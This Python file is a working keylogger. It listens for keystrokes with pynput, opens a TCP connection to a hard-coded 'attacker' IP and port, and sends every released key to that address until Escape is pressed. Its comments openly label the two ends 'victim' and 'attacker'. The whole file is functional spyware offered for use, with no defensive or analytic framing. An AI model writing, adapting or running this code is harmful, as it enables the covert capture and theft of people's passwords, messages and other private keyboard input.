from pynput import keyboard                     # pynput libray is used to monitor the keyboard events and can be used for mouse events also

import socket                                   # socket library is used to establish the connection between the client(victim) and server(attacker)

attacker_address=('192.1.1.1',8000)             # change ip address of server/attacker

victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # we have to close the socket manually in this case as we are not using "with" statement
                                                
                                                # AF_INET for ipv4 
                                                # SOCK_STREAM for TCP connection (SOCK_DGRAM for UDP connection)

victim_socket.connect(attacker_address)         # connect to the attacker's ip address and port number

def press(key):                                 # function to monitor the key press event
    try:
        print(" clicked {}",format(key.char))   # to print which key is pressed only if it is a character(alphanumeric)
        
    except AttributeError:
        print("clicked {}",format(key))         # else print the key(special characters and symbols) which is pressed
        
def release(key):
    if key == keyboard.Key.esc:                 # if the key pressed is escape key then close the connection
        victim_socket.close()
        return False
    else:                                       # else send the key pressed to the attacker
        try:
            message=str(key.char)
        except AttributeError:                  # AttributeError is raised when the key pressed is a special character or symbol
            message=str(key)
        victim_socket.sendall(message.encode('utf-8'))  # send the key pressed to the attacker in utf-8 (encoded) format
       
with keyboard.Listener(on_press=press, on_release=release) as listener:
    listener.join()                                         # start the listener to monitor the key press and release events